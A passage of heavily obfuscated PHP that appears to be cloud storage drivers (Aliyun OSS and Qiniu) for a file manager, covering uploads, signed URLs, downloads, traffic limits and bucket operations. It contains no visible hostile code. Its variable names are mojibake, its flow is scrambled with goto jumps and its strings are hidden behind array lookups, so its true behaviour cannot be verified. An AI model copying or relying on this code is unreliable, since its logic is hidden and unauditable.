=> 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($DªòºÖÏ£Ú[1288] => @md5_file($dêƒÒŸê·à)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($BËÜÉ·’êç))); $e∂–ﬁø§å‡ = $this->trafficLimit($DªòºÖÏ£Ú[1298], $e∂–ﬁø§å‡); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($cΩ‡î„ΩÌº), $dêƒÒŸê·à, $e∂–ﬁø§å‡); } catch (OSS\Core\OssException $Dñºã÷óì∫) { return !1; } return $this->getPathOuter($BËÜÉ·’êç); } public function getHost() { $d«Ñ≤é…¥ß =& $_SERVER[Öíæ€“”≠éÏË]; $dÍí∑≤§ﬂ¢ = explode($d«Ñ≤é…¥ß[177], parent::getHost()); return $dÍí∑≤§ﬂ¢[0] . $d«Ñ≤é…¥ß[177] . $this->bucket . $d«Ñ≤é…¥ß[95] . $dÍí∑≤§ﬂ¢[1]; } public function uploadFormData($b€í√áÈÂˆ, $Aä≤´·Àé« = 3600) { goto FÀá˜ö“›•; AË¿√ÇŒ˘“: $FÑﬂé¥›ŒÙ = strpos($aÇÕçèˆı, $Cﬂ±Ñ¨Æ∞Ç[294]); $aÇÕçèˆı = substr($aÇÕçèˆı, 0, $FÑﬂé¥›ŒÙ) . $Cﬂ±Ñ¨Æ∞Ç[1302]; $C”áøÜåË’ = 1048576000 * 5; goto e„âÚø≤ﬂä; Dƒ·ÖÉú£Ò: $Fåâ›‹¢‘® = date($Cﬂ±Ñ¨Æ∞Ç[1301], time() + $AéıñÎﬁ∂Ï); $Fπ≥·õÈ’õ = new DateTime($Fåâ›‹¢‘®); $aÇÕçèˆı = $Fπ≥·õÈ’õ->format(DateTime::ISO8601); goto AË¿√ÇŒ˘“; F»‰–ÑÀãπ: $dÊÉ≠‚»·Œ = base64_encode(hash_hmac($Cﬂ±Ñ¨Æ∞Ç[230], $b‡ãóåÉàÌ, $this->secret, !0)); $BàØåûıï‡ = array($Cﬂ±Ñ¨Æ∞Ç[1210] => $b‡ãóåÉàÌ, $Cﬂ±Ñ¨Æ∞Ç[1304] => $this->accessKey, $Cﬂ±Ñ¨Æ∞Ç[1206] => $Cﬂ±Ñ¨Æ∞Ç[1198], $Cﬂ±Ñ¨Æ∞Ç[1305] => $dÊÉ≠‚»·Œ, $Cﬂ±Ñ¨Æ∞Ç[175] => $FÉÀÍâÑñÒ); $BàØåûıï‡ = $this->trafficLimit($Cﬂ±Ñ¨Æ∞Ç[1298], $BàØåûıï‡); goto FÎ°üƒØ˜ƒ; e„âÚø≤ﬂä: $fΩ¢˜≠◊Ë¯ = $this->pathFather($b€í√áÈÂˆ); $Bñê†ê´Ñ† = array($Cﬂ±Ñ¨Æ∞Ç[1200] => $aÇÕçèˆı, $Cﬂ±Ñ¨Æ∞Ç[1201] => array(array($Cﬂ±Ñ¨Æ∞Ç[1303], 0, $C”áøÜåË’), array($Cﬂ±Ñ¨Æ∞Ç[1204], $Cﬂ±Ñ¨Æ∞Ç[1205], $fΩ¢˜≠◊Ë¯))); $b‡ãóåÉàÌ = base64_encode(json_encode($Bñê†ê´Ñ†)); goto F»‰–ÑÀãπ; FÎ°üƒØ˜ƒ: return $BàØåûıï‡; goto dú“ï∏©Ò‘; FÀá˜ö“›•: $Cﬂ±Ñ¨Æ∞Ç =& $_SERVER[Öíæ€“”≠éÏË]; if (!($FÉÀÍâÑñÒ = $this->getHost())) { return !1; } $AéıñÎﬁ∂Ï = $Aä≤´·Àé«; goto Dƒ·ÖÉú£Ò; dú“ï∏©Ò‘: } public function multiUploadFormData($bí„’„Æıˆ, $E£ñ‰Ωßå‰ = 3600) { $eßã∂∂í≥æ =& $_SERVER[Öíæ€“”≠éÏË]; if (!($e®¬ØÕÙ´‡ = $this->getHost())) { return !1; } $dÜ‰œˆÚ» = $this->trafficLimit($eßã∂∂í≥æ[1298]); $bêÑÌ∫õµ€ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bí„’„Æıˆ), $dÜ‰œˆÚ»); return array($eßã∂∂í≥æ[221] => $bêÑÌ∫õµ€, $eßã∂∂í≥æ[175] => $e®¬ØÕÙ´‡ . $eßã∂∂í≥æ[8] . $this->pathEncode($bí„’„Æıˆ), $eßã∂∂í≥æ[222] => gmdate($eßã∂∂í≥æ[1306]), $eßã∂∂í≥æ[93] => $bí„’„Æıˆ); } public function multiUploadAuthData($eÇŸîÌ¯ëÿ, $E¯Öé≠º‰Ù = array()) { goto DÈàïıì“Î; Bô‹ÒÓ⁄ÇÍ: if (!empty($E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[1308]])) { $e®üﬁﬁïÓè = array_merge(array($b∆±æºùó’[4]), $E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[1308]]); sort($e®üﬁﬁïÓè); $b∆±æºùó’[4] = implode($e≥⁄˘ƒéôè[229], $e®üﬁﬁïÓè); } $bùå£ëì§ä = implode($e≥⁄˘ƒéôè[229], $b∆±æºùó’); $eıƒ‹æèó• = base64_encode(hash_hmac($e≥⁄˘ƒéôè[230], $bùå£ëì§ä, $this->secret, !0)); goto eçÙ·¢⁄éµ; fâüÔ÷–≥„: $b∆±æºùó’ = array($e≥⁄˘ƒéôè[224], $e≥⁄˘ƒéôè[33], $e≥⁄˘ƒéôè[119], $bëÛ´ö§ä’, "\x78\x2d\x6f\x73\x73\55\x64\141\x74\x65\x3a{$bëÛ´ö§ä’}", $e≥⁄˘ƒéôè[8] . $this->bucket . $e≥⁄˘ƒéôè[8] . $E”«„È£Êè . $D∞êÇçÌ˜¿); if (strpos($D∞êÇçÌ˜¿, $e≥⁄˘ƒéôè[225]) === 0) { $b∆±æºùó’[0] = $e≥⁄˘ƒéôè[226]; if ($a ·éìç¢œ = $this->trafficLimit($e≥⁄˘ƒéôè[1298])) { $E”«„È£Êè = $e≥⁄˘ƒéôè[1307]; array_splice($b∆±æºùó’, 5, 0, $E”«„È£Êè . $e≥⁄˘ƒéôè[4] . $a ·éìç¢œ[$E”«„È£Êè]); } } if (isset($E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[227]]) && $E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[227]] == $e≥⁄˘ƒéôè[228]) { $b∆±æºùó’[0] = $e≥⁄˘ƒéôè[228]; } goto Bô‹ÒÓ⁄ÇÍ; DÈàïıì“Î: $e≥⁄˘ƒéôè =& $_SERVER[Öíæ€“”≠éÏË]; $bëÛ´ö§ä’ = isset($E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[222]]) ? $E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[222]] : gmdate($e≥⁄˘ƒéôè[1306]); $D∞êÇçÌ˜¿ = isset($E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[168]]) ? $E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[168]] : $e≥⁄˘ƒéôè[33]; goto FÍ⁄µﬂ‘ìæ; FÍ⁄µﬂ‘ìæ: $E”«„È£Êè = $eÇŸîÌ¯ëÿ; if (isset($E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[93]])) { $E”«„È£Êè = $E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[93]]; unset($E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[93]]); } if (isset($E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[223]])) { $E¯Öé≠º‰Ù[$e≥⁄˘ƒéôè[222]] = $bëÛ´ö§ä’; return $this->listUploadParts($E”«„È£Êè, $E¯Öé≠º‰Ù); } goto fâüÔ÷–≥„; eçÙ·¢⁄éµ: $d…õÍßÚŸ™ = $e≥⁄˘ƒéôè[1272] . $this->accessKey . $e≥⁄˘ƒéôè[4] . $eıƒ‹æèó•; if (strpos($D∞êÇçÌ˜¿, $e≥⁄˘ƒéôè[225]) === 0) { $d…õÍßÚŸ™ = array($e≥⁄˘ƒéôè[232] => $d…õÍßÚŸ™, $e≥⁄˘ƒéôè[222] => $bëÛ´ö§ä’); if ($a ·éìç¢œ) { $d…õÍßÚŸ™ = array_merge($d…õÍßÚŸ™, $a ·éìç¢œ); } } return $d…õÍßÚŸ™; goto aÚ«ëÂºÜÿ; aÚ«ëÂºÜÿ: } public function listUploadParts($d—µÆ‰´‘ë, $DÈÈÈ»∞êò) { goto eü‹ÑîÃôª; F∆Îá÷äèø: unset($DÈÈÈ»∞êò[$Cí°‹Ó—êó[223]], $DÈÈÈ»∞êò[$Cí°‹Ó—êó[227]]); $d“±êßÃØ– = $this->multiUploadAuthData($d—µÆ‰´‘ë, $DÈÈÈ»∞êò); if (empty($d“±êßÃØ–)) { return !1; } goto Eˆ«„®Á™¨; eü‹ÑîÃôª: $Cí°‹Ó—êó =& $_SERVER[Öíæ€“”≠éÏË]; $C§ˆÍ°ÈÁ∂ = parse_url_query($DÈÈÈ»∞êò[$Cí°‹Ó—êó[168]]); $BüÛ∫∑®ë∑ = $this->client->listParts($this->bucket, $this->pathEncode($d—µÆ‰´‘ë), $C§ˆÍ°ÈÁ∂[$Cí°‹Ó—êó[221]]); goto aì∞ÊÕ£€ã; aì∞ÊÕ£€ã: $aëäˆœñ…“ = $BüÛ∫∑®ë∑->getListPart(); $aÓ≈∞∑·¯Ï = array(); foreach ($aëäˆœñ…“ as $aöÇŸÓ´¥¢) { $aÓ≈∞∑·¯Ï[] = array($Cí°‹Ó—êó[1292] => $aöÇŸÓ´¥¢->getPartNumber(), $Cí°‹Ó—êó[1293] => trim($aöÇŸÓ´¥¢->getETag(), $Cí°‹Ó—êó[116])); } goto F∆Îá÷äèø; Eˆ«„®Á™¨: return array($Cí°‹Ó—êó[232] => $d“±êßÃØ–, $Cí°‹Ó—êó[222] => $DÈÈÈ»∞êò[$Cí°‹Ó—êó[222]], $Cí°‹Ó—êó[234] => $aÓ≈∞∑·¯Ï); goto Dô©⁄°≥Ú›; Dô©⁄°≥Ú›: } public function download($Báªœ∂Èè¬, $b∞’íªÃø¢) { if ($this->isFolder($Báªœ∂Èè¬)) { return !1; } try { $b€ôã“±‰ÿ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $b∞’íªÃø¢); $b€ôã“±‰ÿ = $this->trafficLimit($_SERVER[Öíæ€“”≠éÏË][109], $b€ôã“±‰ÿ); $this->client->getObject($this->bucket, $this->pathEncode($Báªœ∂Èè¬), $b€ôã“±‰ÿ); } catch (OSS\Core\OssException $cäëù◊Ü”Ö) { return !1; } return $b∞’íªÃø¢; } public function fileSubstr($D˜ßòôÇüÃ, $C…Öæ§æ’È = 0, $eÓû◊‚†á≈ = false) { if ($C…Öæ§æ’È === -1) { $dıîêµ≥èØ = array(); } else { if ($eÓû◊‚†á≈ === !1) { $EÉéÛ©—Æº = $this->size($D˜ßòôÇüÃ); } else { $EÉéÛ©—Æº = $C…Öæ§æ’È + $eÓû◊‚†á≈ - 1; } $dıîêµ≥èØ = array(OSS\OssClient::OSS_RANGE => "{$C…Öæ§æ’È}\55{$EÉéÛ©—Æº}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($D˜ßòôÇüÃ), $dıîêµ≥èØ); } catch (OSS\Core\OssException $eË§€Ÿ∂Ê˘) { think_exception($eË§€Ÿ∂Ê˘->getMessage()); return !1; } } private function trafficLimit($eèÉÛÏ–Ëì, $b≥Üäì◊◊” = array()) { goto cÀﬁüõÊè∂; cÀﬁüõÊè∂: $B∆Ãû∏Êë¨ =& $_SERVER[Öíæ€“”≠éÏË]; if ($eèÉÛÏ–Ëì == $B∆Ãû∏Êë¨[1298] && $this->isUploadServer() || $eèÉÛÏ–Ëì == $B∆Ãû∏Êë¨[109] && $this->isFileOutServer()) { return $b≥Üäì◊◊”; } $BåÚ˘¬Æü‹ = floatval($GLOBALS[$B∆Ãû∏Êë¨[6]][$B∆Ãû∏Êë¨[88]][$B∆Ãû∏Êë¨[107]][$eèÉÛÏ–Ëì]) * 1024 * 1024 * 8; goto fò¥˜åëºÜ; fò¥˜åëºÜ: if (!$BåÚ˘¬Æü‹) { return $b≥Üäì◊◊”; } $BåÚ˘¬Æü‹ = $BåÚ˘¬Æü‹ < 819200 ? 819200 : ($BåÚ˘¬Æü‹ > 838860800 ? 838860800 : $BåÚ˘¬Æü‹); $b≥Üäì◊◊”[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($BåÚ˘¬Æü‹); goto A˘∫õ¥Ñ∂ä; A˘∫õ¥Ñ∂ä: return $b≥Üäì◊◊”; goto cÁ°Â›≤´‡; cÁ°Â›≤´‡: } public function link($bÈì‚◊åÇô, $b»äêù÷“« = array()) { $CªÊÚÈﬂÎﬂ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->exist($bÈì‚◊åÇô) || $this->isFolder($bÈì‚◊åÇô)) { return !1; } try { $b»äêù÷“« = $this->trafficLimit($CªÊÚÈﬂÎﬂ[109], $b»äêù÷“«); $E¥⁄«‡È…Ö = $this->client->signUrl($this->bucket, $this->pathEncode($bÈì‚◊åÇô), 3600 * 12, $CªÊÚÈﬂÎﬂ[228], $b»äêù÷“«); return $this->getCdnLink($E¥⁄«‡È…Ö); } catch (OSS\Core\OssException $A”¬£¶®¢ú) { return !1; } } public function fileOut($Cô∞»◊ãàä, $bêäÎÃ—Üù = false, $DªÉÎ€∆ﬁ = false, $dÈãÇ€áãÖ = '') { goto a”‡–ˆÖ®√; Aç™¬ê¡∫: $b”ùŒ´ôèí = $this->link($Cô∞»◊ãàä, $aèÍËÓêòƒ); $this->fileOutLink($b”ùŒ´ôèí); goto dÿá¡ú…˘Æ; føöÁ√æÑã: $bêäÎÃ—Üù = $bêäÎÃ—Üù ? $fáÎÂ§œ∆Ω[214] : $fáÎÂ§œ∆Ω[215]; $aèÍËÓêòƒ = array(OSS\OssClient::OSS_SUB_RESOURCE => $fáÎÂ§œ∆Ω[1309] . rawurlencode("{$bêäÎÃ—Üù}\x3b\146\151\x6c\145\156\141\155\145\75{$DªÉÎ€∆ﬁ}")); $aèÍËÓêòƒ[OSS\OssClient::OSS_SUB_RESOURCE] .= $fáÎÂ§œ∆Ω[1310] . rawurlencode($dπËûØûã‘); goto Aç™¬ê¡∫; fçö√ﬁ¨¶Û: $DªÉÎ€∆ﬁ = rawurlencode($DªÉÎ€∆ﬁ); $dπËûØûã‘ = get_file_mime(get_path_ext($DªÉÎ€∆ﬁ)); if ($dπËûØûã‘ == $fáÎÂ§œ∆Ω[213]) { return parent::fileOut($Cô∞»◊ãàä, $bêäÎÃ—Üù, $DªÉÎ€∆ﬁ, $dÈãÇ€áãÖ); } goto føöÁ√æÑã; a”‡–ˆÖ®√: $fáÎÂ§œ∆Ω =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->isFileOutServer()) { return $this->fileOutServer($Cô∞»◊ãàä, $bêäÎÃ—Üù, $DªÉÎ€∆ﬁ, $dÈãÇ€áãÖ); } if (!$DªÉÎ€∆ﬁ) { $DªÉÎ€∆ﬁ = $this->pathThis($Cô∞»◊ãàä); } goto fçö√ﬁ¨¶Û; dÿá¡ú…˘Æ: } public function fileOutServer($EÃ‚ø¯Ñö·, $e”Üµòï†æ = false, $F∆ÆÇıµ—´ = false, $e©ÎûÈüùà = '') { parent::fileOut($EÃ‚ø¯Ñö·, $e”Üµòï†æ, $F∆ÆÇıµ—´, $e©ÎûÈüùà); } public function fileOutImage($d–®æÈ’√æ, $b›◊À∫⁄•ÿ = 250) { $dá∞áÌëŸß = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Öíæ€“”≠éÏË][1311] . $b›◊À∫⁄•ÿ); $cÑ∫ï£–ﬂ≤ = $this->link($d–®æÈ’√æ, $dá∞áÌëŸß); $this->fileOutLink($cÑ∫ï£–ﬂ≤); } public function fileOutImageServer($E©ÈñÓ∆Ò£, $bùØà∞Ööã = 250) { parent::fileOutImage($E©ÈñÓ∆Ò£, $bùØà∞Ööã); } public function fileOutLink($F åÖ–ôÀü) { $fúàıƒÛàﬂ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->isCdnHost() && substr($F åÖ–ôÀü, 0, 7) == $fúàıƒÛàﬂ[1213]) { $F åÖ–ôÀü = $fúàıƒÛàﬂ[1214] . substr($F åÖ–ôÀü, 7); } header($fúàıƒÛàﬂ[159] . $F åÖ–ôÀü); die; } public function hashMd5($A´∂ôçÃ∞å, $c£ﬂ¯ô∆Ã’ = '') { $Eß√…¥¥Ü“ =& $_SERVER[Öíæ€“”≠éÏË]; $Cﬁÿ®›ÑÃ˘ = $this->_objectMeta($A´∂ôçÃ∞å); if (!$Cﬁÿ®›ÑÃ˘) { return $Eß√…¥¥Ü“[33]; } if (!isset($Cﬁÿ®›ÑÃ˘[$Eß√…¥¥Ü“[1288]]) && !empty($c£ﬂ¯ô∆Ã’)) { $d˘ıàÒ•ª‚ = $this->updateObjMeta($A´∂ôçÃ∞å, array($Eß√…¥¥Ü“[1288] => $c£ﬂ¯ô∆Ã’)); $Cﬁÿ®›ÑÃ˘[$Eß√…¥¥Ü“[1288]] = $d˘ıàÒ•ª‚ ? $c£ﬂ¯ô∆Ã’ : $Eß√…¥¥Ü“[33]; } return isset($Cﬁÿ®›ÑÃ˘[$Eß√…¥¥Ü“[1288]]) ? strtolower($Cﬁÿ®›ÑÃ˘[$Eß√…¥¥Ü“[1288]]) : $Eß√…¥¥Ü“[33]; } public function size($eËöòõÑπ¢) { $EâÜËÊ√Ôâ = $this->objectMeta($eËöòõÑπ¢); return $EâÜËÊ√Ôâ ? $EâÜËÊ√Ôâ[$_SERVER[Öíæ€“”≠éÏË][78]] : 0; } public function info($BµõΩ”Õ∑‘) { if ($this->isFolder($BµõΩ”Õ∑‘)) { return $this->folderInfo($BµõΩ”Õ∑‘); } else { if ($this->isFile($BµõΩ”Õ∑‘)) { return $this->fileInfo($BµõΩ”Õ∑‘); } } return !1; } public function exist($C∂èﬁﬂã‘Ÿ) { return $this->isFile($C∂èﬁﬂã‘Ÿ) || $this->isFolder($C∂èﬁﬂã‘Ÿ); } public function isFile($bÂÙ¨◊Ÿîè) { return !$this->isFolder($bÂÙ¨◊Ÿîè) && $this->objectMeta($bÂÙ¨◊Ÿîè); } public function isFolder($Eî°Ùë≥Õ–) { return $this->cacheMethod($_SERVER[Öíæ€“”≠éÏË][199], $Eî°Ùë≥Õ–); } protected function objectMeta($b∫©Ü˜Ωéô) { return $this->cacheMethod($_SERVER[Öíæ€“”≠éÏË][200], $b∫©Ü˜Ωéô); } protected function _objectMeta($bëã¥™‰Ï˜) { $cöáàÚøõ„ =& $_SERVER[Öíæ€“”≠éÏË]; try { $Aﬁòã†á∞¯ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($bëã¥™‰Ï˜)); } catch (OSS\Core\OssException $Fñß∫»ºÓ’) { $Aﬁòã†á∞¯ = !1; } if ($Aﬁòã†á∞¯) { $Aﬁòã†á∞¯[$cöáàÚøõ„[78]] = intval($Aﬁòã†á∞¯[$cöáàÚøõ„[1286]]); } return $Aﬁòã†á∞¯; } protected function _isFolder($Cí†òü«ú∫) { $DôÊ—è·Çƒ =& $_SERVER[Öíæ€“”≠éÏË]; if ($Cí†òü«ú∫ == $DôÊ—è·Çƒ[33] || $Cí†òü«ú∫ == $DôÊ—è·Çƒ[8]) { return !0; } $D©…ƒ·‹∂ß = array($DôÊ—è·Çƒ[1282] => $DôÊ—è·Çƒ[8], $DôÊ—è·Çƒ[1283] => rtrim($Cí†òü«ú∫, $DôÊ—è·Çƒ[8]) . $DôÊ—è·Çƒ[8], $DôÊ—è·Çƒ[1284] => 1, $DôÊ—è·Çƒ[1285] => $DôÊ—è·Çƒ[33]); $dÌ◊‰”⁄€˜ = $this->client->listObjects($this->bucket, $D©…ƒ·‹∂ß); if ($dÌ◊‰”⁄€˜->getObjectList() || $dÌ◊‰”⁄€˜->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($cªñıÈ´„í) { parent::__construct(); require_once SDK_DIR . $_SERVER[Öíæ€“”≠éÏË][1312]; $this->_init($cªñıÈ´„í); } public function _init($b“éÇΩ≈πö) { goto DÖƒÆÏïˆ¿; DÖƒÆÏïˆ¿: $a¥ûÉÏ‹äÉ =& $_SERVER[Öíæ€“”≠éÏË]; foreach ($b“éÇΩ≈πö as $e¥ÿ±≠ıç  => $DÕöàÑ¢áÉ) { if (isset($this->{$e¥ÿ±≠ıç })) { $this->{$e¥ÿ±≠ıç } = $DÕöàÑ¢áÉ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($a¥ûÉÏ‹äÉ[1313] . LNG($a¥ûÉÏ‹äÉ[1273])); } goto FÇﬁº∫⁄Ìì; FÇﬁº∫⁄Ìì: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto bãÉí«Ìò’; bãÉí«Ìò’: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto AÆ≈Ü´®Ω∑; AÆ≈Ü´®Ω∑: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($c≥Ìƒ’Ü√¢, $cäıº”Úâæ = '', $bÂ§∆üÎ° = REPEAT_RENAME) { if ($this->setContent($c≥Ìƒ’Ü√¢, $cäıº”Úâæ)) { return $this->getPathOuter($c≥Ìƒ’Ü√¢); } return !1; } public function mkdir($FÑŸ·Á€ÉÔ, $bÆÎŒË⁄â‹ = REPEAT_SKIP) { goto F¶çÑøÉ◊Ï; F¶çÑøÉ◊Ï: $AÆî‚üœ“¿ =& $_SERVER[Öíæ€“”≠éÏË]; $AáÆﬁÍ√Ã¶ = trim($FÑŸ·Á€ÉÔ, $AÆî‚üœ“¿[8]); if ($this->_isFolder($AáÆﬁÍ√Ã¶)) { return $this->getPathOuter($AáÆﬁÍ√Ã¶); } goto A¥î∂®ê¬Ç; DŸÀ·ÊêÎà: if (!$this->mkfile($Cë§‚Ω≠É´)) { return !1; } if (!$this->moveFile($Cë§‚Ω≠É´, $FÑŸ·Á€ÉÔ)) { $this->delFile($Cë§‚Ω≠É´); return !1; } return $this->getPathOuter($AáÆﬁÍ√Ã¶); goto bçÇ≤ßﬁŒ—; A¥î∂®ê¬Ç: $FÑŸ·Á€ÉÔ = $AáÆﬁÍ√Ã¶ . $AÆî‚üœ“¿[8]; $DÛîôàºÑ◊ = get_path_this($AáÆﬁÍ√Ã¶); $Cë§‚Ω≠É´ = $FÑŸ·Á€ÉÔ . $DÛîôàºÑ◊; goto DŸÀ·ÊêÎà; bçÇ≤ßﬁŒ—: } public function copyFile($a’¢ ÁûñÃ, $f—å´ßÚ ô) { $eëë–÷Û∂ß = $this->bucketManager->copy($this->bucket, $a’¢ ÁûñÃ, $this->bucket, $f—å´ßÚ ô, !0); return $eëë–÷Û∂ß ? !1 : $this->getPathOuter($f—å´ßÚ ô); } public function moveFile($D£â√€ßúï, $AãâﬁÚ¥éÔ) { $e•‘ÎÑ≠¶· = $this->bucketManager->move($this->bucket, $D£â√€ßúï, $this->bucket, $AãâﬁÚ¥éÔ, !0); return $e•‘ÎÑ≠¶· ? !1 : $this->getPathOuter($AãâﬁÚ¥éÔ); } public function delFile($d∂ÓÕ∞À‚ü) { if (!$this->exist($d∂ÓÕ∞À‚ü)) { return !0; } $A´†Ñå‡ÁÕ = $this->bucketManager->delete($this->bucket, $d∂ÓÕ∞À‚ü); return $A´†Ñå‡ÁÕ ? !1 : !0; } public function delFolder($DˆÆ£‚ó¨ê) { goto d‘®ëú∫‰º; EçÂÚÖÛ√™: $cÒ’Ç…Àú‚ = $this->delByBatch($bë¶Ù‹·◊ó[$E⁄∂ﬁÇÍÆ[75]]); if (!$cÒ’Ç…Àú‚) { return !1; } return $this->delFile($c⁄üﬁãäß˘); goto e´˜í§È«–; d‘®ëú∫‰º: $E⁄∂ﬁÇÍÆ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->exist($DˆÆ£‚ó¨ê)) { return !0; } $this->listItemCache = !1; goto eÃîÆÜò¶€; BÙáó•‘°Ë: if (!empty($DˆÆ£‚ó¨ê) && $DˆÆ£‚ó¨ê !== $E⁄∂ﬁÇÍÆ[191] && !in_array($c⁄üﬁãäß˘, $bë¶Ù‹·◊ó[$E⁄∂ﬁÇÍÆ[75]])) { $bë¶Ù‹·◊ó[$E⁄∂ﬁÇÍÆ[75]][] = $c⁄üﬁãäß˘; } $cÒ’Ç…Àú‚ = $this->delByBatch($bë¶Ù‹·◊ó[$E⁄∂ﬁÇÍÆ[74]]); if (!$cÒ’Ç…Àú‚) { return !1; } goto EçÂÚÖÛ√™; eÃîÆÜò¶€: $bë¶Ù‹·◊ó = $this->fileList($DˆÆ£‚ó¨ê); $this->listItemCache = !0; $c⁄üﬁãäß˘ = trim($DˆÆ£‚ó¨ê, $E⁄∂ﬁÇÍÆ[8]) . $E⁄∂ﬁÇÍÆ[8]; goto BÙáó•‘°Ë; e´˜í§È«–: } private function delByBatch($a∫∑÷ëÍ‹∑) { foreach (array_chunk($a∫∑÷ëÍ‹∑, 1000) as $dÃÛ”àΩêú) { $eá»û¨ë¨â = $this->bucketManager->buildBatchDelete($this->bucket, $dÃÛ”àΩêú); list($B»Éä©≠ã†, $b›ö∆Úºüù) = $this->bucketManager->batch($eá»û¨ë¨â); if ($b›ö∆Úºüù) { return !1; } } return !0; } public function rename($AÉ„‚∆‚ÖÁ, $E“ò¨…€‡•) { return $this->renameObject($AÉ„‚∆‚ÖÁ, $E“ò¨…€‡•); } public function fileInfo($fÒåö§¬∏”, $A∫Ñ¶òëπ≥ = false, $d°”õ·Ô”è = array()) { goto F≥áÊºÚÓ§; F¯´ÎàãùÎ: $CçËê”Öπ—[$dìõÊ¨î™í[194]] = $CçËê”Öπ—[$dìõÊ¨î™í[84]] = 0; $CçËê”Öπ—[$dìõÊ¨î™í[195]] = $CçËê”Öπ—[$dìõÊ¨î™í[196]] = !0; if (empty($d°”õ·Ô”è)) { $d°”õ·Ô”è = $this->objectMeta($fÒåö§¬∏”); if (!$d°”õ·Ô”è) { return $CçËê”Öπ—; } } goto fª√•æïΩ±; fª√•æïΩ±: if (isset($d°”õ·Ô”è[$dìõÊ¨î™í[1315]])) { $CçËê”Öπ—[$dìõÊ¨î™í[84]] = substr($d°”õ·Ô”è[$dìõÊ¨î™í[1315]] . $dìõÊ¨î™í[33], 0, 10); } if (isset($d°”õ·Ô”è[$dìõÊ¨î™í[1314]])) { $CçËê”Öπ—[$dìõÊ¨î™í[78]] = $d°”õ·Ô”è[$dìõÊ¨î™í[1314]]; } return $CçËê”Öπ—; goto bÓÿìÌØ£é; F≥áÊºÚÓ§: $dìõÊ¨î™í =& $_SERVER[Öíæ€“”≠éÏË]; $CçËê”Öπ— = array($dìõÊ¨î™í[28] => $this->pathThis($fÒåö§¬∏”), $dìõÊ¨î™í[76] => $this->getPathOuter($dìõÊ¨î™í[8] . $fÒåö§¬∏”), $dìõÊ¨î™í[29] => $dìõÊ¨î™í[193], $dìõÊ¨î™í[78] => isset($d°”õ·Ô”è[$dìõÊ¨î™í[1314]]) ? $d°”õ·Ô”è[$dìõÊ¨î™í[1314]] : 0, $dìõÊ¨î™í[168] => $this->ext($fÒåö§¬∏”)); if ($A∫Ñ¶òëπ≥) { return $CçËê”Öπ—; } goto F¯´ÎàãùÎ; bÓÿìÌØ£é: } public function folderInfo($fƒÇè»Ô, $Bö†≈‡Ú˘ƒ = false) { goto e¿‰ëπ“ÇÜ; e¿‰ëπ“ÇÜ: $eıÆìçø¥ì =& $_SERVER[Öíæ€“”≠éÏË]; $bÈÙ≥·¯É’ = array($eıÆìçø¥ì[28] => $this->pathThis($fƒÇè»Ô), $eıÆìçø¥ì[76] => $this->getPathOuter($eıÆìçø¥ì[8] . $fƒÇè»Ô), $eıÆìçø¥ì[29] => $eıÆìçø¥ì[77]); if ($Bö†≈‡Ú˘ƒ) { return $bÈÙ≥·¯É’; } goto aÖ‡äÿ¿Ì®; aÖ‡äÿ¿Ì®: $bÈÙ≥·¯É’[$eıÆìçø¥ì[194]] = $bÈÙ≥·¯É’[$eıÆìçø¥ì[84]] = 0; $bÈÙ≥·¯É’[$eıÆìçø¥ì[195]] = $bÈÙ≥·¯É’[$eıÆìçø¥ì[196]] = !0; $fƒÇè»Ô = rtrim($fƒÇè»Ô, $eıÆìçø¥ì[8]) . $eıÆìçø¥ì[8]; goto dèá…ó£ƒ®; dèá…ó£ƒ®: $fÃ∞Ïçõ€ﬂ = $this->objectMeta($fƒÇè»Ô); if (isset($fÃ∞Ïçõ€ﬂ[$eıÆìçø¥ì[1315]])) { $bÈÙ≥·¯É’[$eıÆìçø¥ì[84]] = substr($fÃ∞Ïçõ€ﬂ[$eıÆìçø¥ì[1315]] . $eıÆìçø¥ì[33], 0, 10); } return $bÈÙ≥·¯É’; goto d‘ó…ø˘ñ†; d‘ó…ø˘ñ†: } public function listPath($c±◊ìãŒÖê, $fè∂ä˘·å∂ = false) { $fÕÎÕèªª =& $_SERVER[Öíæ€“”≠éÏË]; $f∂©–≥Ñ≥É = $this->fileList($c±◊ìãŒÖê, $fÕÎÕèªª[8], !0); foreach ($f∂©–≥Ñ≥É[$fÕÎÕèªª[75]] as $CΩ‘•»©◊ç => $cÓãø€∂ÜÖ) { $f∂©–≥Ñ≥É[$fÕÎÕèªª[75]][$CΩ‘•»©◊ç] = $this->folderInfo($cÓãø€∂ÜÖ, $fè∂ä˘·å∂); 